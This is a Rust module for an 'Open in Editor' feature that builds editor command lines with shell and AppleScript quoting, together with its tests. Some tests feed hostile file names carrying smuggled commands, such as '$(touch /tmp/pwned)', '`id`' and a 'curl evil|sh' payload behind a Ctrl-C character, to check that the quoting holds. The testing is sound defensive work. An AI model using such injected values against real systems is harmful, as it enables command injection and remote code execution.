//! "Open in Editor": the command line that opens a file at a line in the
//! user's editor, and launching it.
//!
//! The editor is, in order: the one picked in Settings, the
//! `SRCWRANGLR_EDITOR` template (e.g.
//! `code -g {file}:{line}:{column}`), `$VISUAL`, `$EDITOR`, VS Code if
//! `code` is on the PATH, else the system's default opener. Terminal
//! editors (vim, nano, …) open in a new terminal window.
//!
//! No shell parses the command, except the one the new terminal window
//! runs; every word is quoted for it, since file names come from the
//! indexed (possibly hostile) source tree.

use std::path::PathBuf;

use crate::programs::SearchPath;

/// A place in a file on disk; `line` and `column` are 1-based.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SourcePosition {
    pub path: PathBuf,
    pub line: u32,
    pub column: u32,
}

/// A program and its arguments, run without a shell.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Launch {
    pub program: String,
    pub args: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Os {
    MacOs,
    Other,
}

/// What decides the editor: your setting, then the environment.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EditorEnv {
    /// From Settings: an editor command (`zed`, `vim`) or a template with
    /// `{file}` in it.
    pub setting: Option<String>,
    pub template: Option<String>,
    pub visual: Option<String>,
    pub editor: Option<String>,
    pub has_vscode: bool,
    pub os: Os,
}

/// How an editor takes the line (and column) to open at.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LineArgs {
    /// `-g file:line:column` (VS Code and its forks).
    Goto,
    /// `file:line:column`.
    Suffix,
    /// `+line file`.
    Plus,
    /// `+line:column file`.
    PlusColumn,
    /// `-l line file` (TextMate).
    DashL,
    /// `--line line file` (JetBrains IDEs).
    DashDashLine,
    /// Just `file`: the editor's line syntax is unknown.
    FileOnly,
}

/// Editors we know the line syntax of, and whether they need a terminal.
const KNOWN_EDITORS: &[(&str, LineArgs, bool)] = &[
    ("code", LineArgs::Goto, false),
    ("code-insiders", LineArgs::Goto, false),
    ("codium", LineArgs::Goto, false),
    ("cursor", LineArgs::Goto, false),
    ("windsurf", LineArgs::Goto, false),
    ("subl", LineArgs::Suffix, false),
    ("zed", LineArgs::Suffix, false),
    ("hx", LineArgs::Suffix, true),
    ("helix", LineArgs::Suffix, true),
    ("vi", LineArgs::Plus, true),
    ("vim", LineArgs::Plus, true),
    ("nvim", LineArgs::Plus, true),
    ("nano", LineArgs::Plus, true),
    ("kak", LineArgs::Plus, true),
    ("gvim", LineArgs::Plus, false),
    ("mvim", LineArgs::Plus, false),
    ("micro", LineArgs::PlusColumn, true),
    ("emacs", LineArgs::PlusColumn, false),
    ("emacsclient", LineArgs::PlusColumn, false),
    ("mate", LineArgs::DashL, false),
    ("idea", LineArgs::DashDashLine, false),
    ("clion", LineArgs::DashDashLine, false),
];

const TEMPLATE_VAR: &str = "SRCWRANGLR_EDITOR";
const VSCODE: &str = "code";

impl EditorEnv {
    /// `setting`, then this process's environment; programs are looked
    /// for with `search`.
    pub fn from_process(setting: Option<&str>, search: &SearchPath) -> Self {
        let var = |name| std::env::var(name).ok();
        Self {
            setting: setting.map(String::from),
            template: var(TEMPLATE_VAR),
            visual: var("VISUAL"),
            editor: var("EDITOR"),
            has_vscode: search.find(VSCODE).is_some(),
            os: if cfg!(target_os = "macos") {
                Os::MacOs
            } else {
                Os::Other
            },
        }
    }
}

/// The command that opens `position` in the configured editor, or why it
/// can't be opened safely.
pub fn editor_launch(env: &EditorEnv, position: &SourcePosition) -> Result<Launch, String> {
    if let Some(setting) = non_blank(&env.setting) {
        return match setting.contains("{file}") {
            true => Ok(from_template(setting, position)),
            false => from_editor_command(setting, env.os, position),
        };
    }
    if let Some(template) = non_blank(&env.template) {
        return Ok(from_template(template, position));
    }
    if let Some(command) = non_blank(&env.visual).or(non_blank(&env.editor)) {
        return from_editor_command(command, env.os, position);
    }
    if env.has_vscode {
        return Ok(with_line_args(
            VSCODE.into(),
            Vec::new(),
            LineArgs::Goto,
            position,
        ));
    }
    let file = path_text(position);
    Ok(match env.os {
        Os::MacOs => Launch {
            program: "open".into(),
            args: vec!["-t".into(), file],
        },
        Os::Other => Launch {
            program: "xdg-open".into(),
            args: vec![file],
        },
    })
}

/// Starts the editor (your `setting`, else as the environment says)
/// without waiting for it, found with `search` and run with it as its
/// `PATH`. Returns the program started.
pub fn open_in_editor(
    position: &SourcePosition,
    setting: Option<&str>,
    search: &SearchPath,
) -> Result<String, String> {
    let launch = editor_launch(&EditorEnv::from_process(setting, search), position)?;
    let program = resolve(&launch.program, search)?;
    let mut child = std::process::Command::new(&program)
        .args(&launch.args)
        .env("PATH", search.joined())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .map_err(|e| format!("Could not start {}: {e}", launch.program))?;
    let program = launch.program.clone();
    // Reap the child so it doesn't linger as a zombie; report failures.
    std::thread::spawn(move || match child.wait() {
        Ok(status) if !status.success() => eprintln!("{program} exited with {status}"),
        Ok(_) => {}
        Err(e) => eprintln!("waiting for {program} failed: {e}"),
    });
    Ok(launch.program)
}

/// Where `program` is: found with `search`, else left to the system by
/// name. A relative path (`bin/x`) is refused: it would depend on the
/// folder the app happens to run in.
fn resolve(program: &str, search: &SearchPath) -> Result<PathBuf, String> {
    if let Some(found) = search.find(program) {
        return Ok(found);
    }
    let path = std::path::Path::new(program);
    if path.components().count() > 1 && !path.is_absolute() {
        return Err(format!(
            "The editor {program} isn't a full path: give its full path, or just its name, in Settings."
        ));
    }
    Ok(path.to_path_buf())
}

fn non_blank(value: &Option<String>) -> Option<&str> {
    value.as_deref().map(str::trim).filter(|v| !v.is_empty())
}

fn path_text(position: &SourcePosition) -> String {
    position.path.to_string_lossy().into_owned()
}

/// `SRCWRANGLR_EDITOR`: whitespace-separated words with `{file}`,
/// `{line}` and `{column}` filled in; the file is appended if the template
/// doesn't place it.
fn from_template(template: &str, position: &SourcePosition) -> Launch {
    let (file, line, column) = (
        path_text(position),
        position.line.to_string(),
        position.column.to_string(),
    );
    let values = [
        ("{file}", file.as_str()),
        ("{line}", line.as_str()),
        ("{column}", column.as_str()),
    ];
    let mut words = template.split_whitespace().map(|w| fill(w, &values));
    let program = words.next().unwrap_or_default();
    let mut args: Vec<String> = words.collect();
    if !template.contains("{file}") {
        args.push(file);
    }
    Launch { program, args }
}

/// Replaces placeholders in one left-to-right pass, so text that came
/// from a value (a file named `{line}.c`) is never substituted again.
fn fill(word: &str, values: &[(&str, &str)]) -> String {
    let mut filled = String::with_capacity(word.len());
    let mut rest = word;
    'scan: while !rest.is_empty() {
        for (key, value) in values {
            if let Some(after) = rest.strip_prefix(key) {
                filled.push_str(value);
                rest = after;
                continue 'scan;
            }
        }
        let mut chars = rest.chars();
        if let Some(c) = chars.next() {
            filled.push(c);
        }
        rest = chars.as_str();
    }
    filled
}

/// `$VISUAL` / `$EDITOR`: a program plus its own arguments.
fn from_editor_command(command: &str, os: Os, position: &SourcePosition) -> Result<Launch, String> {
    let mut words = command.split_whitespace().map(String::from);
    let program = words.next().unwrap_or_default();
    let extra: Vec<String> = words.collect();
    let name = std::path::Path::new(&program)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let (line_args, is_terminal) = KNOWN_EDITORS
        .iter()
        .find(|(known, _, _)| *known == name)
        .map_or((LineArgs::FileOnly, false), |(_, args, terminal)| {
            (*args, *terminal)
        });
    let launch = with_line_args(program, extra, line_args, position);
    if is_terminal {
        in_new_terminal(launch, os)
    } else {
        Ok(launch)
    }
}

fn with_line_args(
    program: String,
    extra: Vec<String>,
    line_args: LineArgs,
    position: &SourcePosition,
) -> Launch {
    let file = path_text(position);
    let (line, column) = (position.line, position.column);
    let tail: Vec<String> = match line_args {
        LineArgs::Goto => vec!["-g".into(), format!("{file}:{line}:{column}")],
        LineArgs::Suffix => vec![format!("{file}:{line}:{column}")],
        LineArgs::Plus => vec![format!("+{line}"), file],
        LineArgs::PlusColumn => vec![format!("+{line}:{column}"), file],
        LineArgs::DashL => vec!["-l".into(), line.to_string(), file],
        LineArgs::DashDashLine => vec!["--line".into(), line.to_string(), file],
        LineArgs::FileOnly => vec![file],
    };
    Launch {
        program,
        args: extra.into_iter().chain(tail).collect(),
    }
}

/// Runs `launch` in a new terminal window: Terminal.app on macOS, the
/// default terminal emulator elsewhere.
///
/// Terminal.app's `do script` *types* the command into an interactive
/// terminal, where control characters (Ctrl-C, Esc, paste markers) act
/// before the shell parses anything, so a command containing any is
/// refused rather than quoted.
fn in_new_terminal(launch: Launch, os: Os) -> Result<Launch, String> {
    match os {
        Os::MacOs => {
            let words = || std::iter::once(&launch.program).chain(&launch.args);
            if words().any(|w| w.chars().any(char::is_control)) {
                return Err(
                    "Not opening a terminal editor: the path contains control characters. \
                     Set SRCWRANGLR_EDITOR to a GUI editor to open it."
                        .into(),
                );
            }
            let command: Vec<String> = words().map(|w| shell_quote(w)).collect();
            let script = format!(
                "tell application \"Terminal\" to do script {}",
                applescript_string(&command.join(" "))
            );
            Ok(Launch {
                program: "osascript".into(),
                args: vec![
                    "-e".into(),
                    script,
                    "-e".into(),
                    "tell application \"Terminal\" to activate".into(),
                ],
            })
        }
        Os::Other => Ok(Launch {
            program: "x-terminal-emulator".into(),
            args: ["-e".to_string(), launch.program]
                .into_iter()
                .chain(launch.args)
                .collect(),
        }),
    }
}

/// `word` quoted for a POSIX shell: it always parses back to exactly `word`.
fn shell_quote(word: &str) -> String {
    format!("'{}'", word.replace('\'', r"'\''"))
}

/// `text` as an AppleScript string literal.
fn applescript_string(text: &str) -> String {
    let escaped = text
        .replace('\\', r"\\")
        .replace('"', r#"\""#)
        .replace('\n', r"\n")
        .replace('\r', r"\r");
    format!("\"{escaped}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn bare_env() -> EditorEnv {
        EditorEnv {
            setting: None,
            template: None,
            visual: None,
            editor: None,
            has_vscode: false,
            os: Os::Other,
        }
    }

    fn position(path: &str) -> SourcePosition {
        SourcePosition {
            path: PathBuf::from(path),
            line: 12,
            column: 5,
        }
    }

    fn launch(program: &str, args: &[&str]) -> Launch {
        Launch {
            program: program.into(),
            args: args.iter().map(|a| a.to_string()).collect(),
        }
    }

    #[test]
    fn an_editor_at_a_relative_path_is_refused() {
        let search = SearchPath::new(&[], None, None);
        assert!(resolve("bin/my-editor", &search).is_err_and(|e| e.contains("full path")));
        assert_eq!(
            resolve("srcwranglr-no-such-editor", &search),
            Ok(PathBuf::from("srcwranglr-no-such-editor"))
        );
    }

    #[test]
    fn your_setting_comes_before_the_environment() {
        let env = EditorEnv {
            setting: Some("zed".into()),
            template: Some("code -g {file}".into()),
            editor: Some("nvim".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/src/a.cc")),
            Ok(launch("zed", &["/src/a.cc:12:5"]))
        );
        let template = EditorEnv {
            setting: Some("subl --wait {file}:{line}".into()),
            ..env
        };
        assert_eq!(
            editor_launch(&template, &position("/src/a.cc")),
            Ok(launch("subl", &["--wait", "/src/a.cc:12"]))
        );
    }

    #[test]
    fn template_fills_placeholders_and_keeps_paths_with_spaces_whole() {
        let env = EditorEnv {
            template: Some("code  -g {file}:{line}:{column}".into()),
            editor: Some("nvim".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/src/my dir/a.cc")),
            Ok(launch("code", &["-g", "/src/my dir/a.cc:12:5"]))
        );
    }

    #[test]
    fn template_without_a_file_placeholder_gets_the_file_appended() {
        let env = EditorEnv {
            template: Some("myedit --new".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/a.cc")),
            Ok(launch("myedit", &["--new", "/a.cc"]))
        );
    }

    #[test]
    fn visual_wins_over_editor_and_known_gui_editors_get_the_line() {
        let env = EditorEnv {
            visual: Some("/usr/local/bin/code --wait".into()),
            editor: Some("nvim".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/a.cc")),
            Ok(launch(
                "/usr/local/bin/code",
                &["--wait", "-g", "/a.cc:12:5"]
            ))
        );
        let subl = EditorEnv {
            editor: Some("subl".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&subl, &position("/a.cc")),
            Ok(launch("subl", &["/a.cc:12:5"]))
        );
    }

    #[test]
    fn terminal_editors_open_in_a_new_terminal_window() {
        let linux = EditorEnv {
            editor: Some("nvim".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&linux, &position("/a.cc")),
            Ok(launch(
                "x-terminal-emulator",
                &["-e", "nvim", "+12", "/a.cc"]
            ))
        );
        let mac = EditorEnv {
            os: Os::MacOs,
            ..linux
        };
        let osascript = editor_launch(&mac, &position("/a.cc")).expect("launch");
        assert_eq!(osascript.program, "osascript");
        assert!(osascript
            .args
            .iter()
            .any(|a| a.contains("do script") && a.contains(r#"'nvim' '+12' '/a.cc'"#)));
    }

    #[test]
    fn unknown_editors_just_get_the_file() {
        let env = EditorEnv {
            editor: Some("ed".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/a.cc")),
            Ok(launch("ed", &["/a.cc"]))
        );
    }

    #[test]
    fn without_a_configured_editor_falls_back_to_vscode_then_the_system() {
        let with_code = EditorEnv {
            has_vscode: true,
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&with_code, &position("/a.cc")),
            Ok(launch("code", &["-g", "/a.cc:12:5"]))
        );
        let mac = EditorEnv {
            os: Os::MacOs,
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&mac, &position("/a.cc")),
            Ok(launch("open", &["-t", "/a.cc"]))
        );
        assert_eq!(
            editor_launch(&bare_env(), &position("/a.cc")),
            Ok(launch("xdg-open", &["/a.cc"]))
        );
    }

    #[test]
    fn blank_settings_are_ignored() {
        let env = EditorEnv {
            template: Some("  ".into()),
            visual: Some(String::new()),
            editor: Some("subl".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/a.cc")).map(|l| l.program),
            Ok("subl".to_string())
        );
    }

    #[cfg(unix)]
    #[test]
    fn shell_quoting_survives_hostile_file_names() {
        let hostile = [
            "plain.c",
            "it's.c",
            "$(touch /tmp/pwned).c",
            "`id`.c",
            "a\"b\\c.c",
            "semi;colon && echo hi.c",
            "new\nline.c",
            "",
        ];
        let script: Vec<String> = hostile
            .iter()
            .map(|w| format!("printf '%s\\0' {}", shell_quote(w)))
            .collect();
        let output = std::process::Command::new("/bin/sh")
            .args(["-c", &script.join("; ")])
            .output()
            .expect("sh");
        let parsed: Vec<&str> = std::str::from_utf8(&output.stdout)
            .expect("utf8")
            .split_terminator('\0')
            .collect();
        assert_eq!(parsed.len(), hostile.len());
        for (got, want) in parsed.iter().zip(hostile) {
            assert_eq!(*got, want);
        }
    }

    #[test]
    fn refuses_to_type_control_characters_into_a_terminal() {
        // Terminal's `do script` types the command into a live terminal,
        // where Ctrl-C (and friends) act before any shell quoting does.
        let mac = EditorEnv {
            editor: Some("nvim".into()),
            os: Os::MacOs,
            ..bare_env()
        };
        for name in ["/a\u{3}; curl evil|sh #.c", "/a\u{1b}[201~.c", "/a\u{85}.c"] {
            assert!(editor_launch(&mac, &position(name)).is_err(), "{name:?}");
        }
        // No terminal involved: the name is just an argument.
        let gui = EditorEnv {
            editor: Some("code".into()),
            ..mac.clone()
        };
        assert!(editor_launch(&gui, &position("/a\u{3}.c")).is_ok());
        let linux = EditorEnv {
            os: Os::Other,
            ..mac
        };
        assert!(editor_launch(&linux, &position("/a\u{3}.c")).is_ok());
    }

    #[test]
    fn placeholders_work_in_the_program_and_values_are_not_reexpanded() {
        let env = EditorEnv {
            template: Some("{file}-viewer --at {line}".into()),
            ..bare_env()
        };
        assert_eq!(
            editor_launch(&env, &position("/x/{line}.c")),
            Ok(launch("/x/{line}.c-viewer", &["--at", "12"]))
        );
    }

    #[test]
    fn applescript_escaping_handles_quotes_and_backslashes() {
        assert_eq!(applescript_string(r#"a"b\c"#), r#""a\"b\\c""#);
    }
}
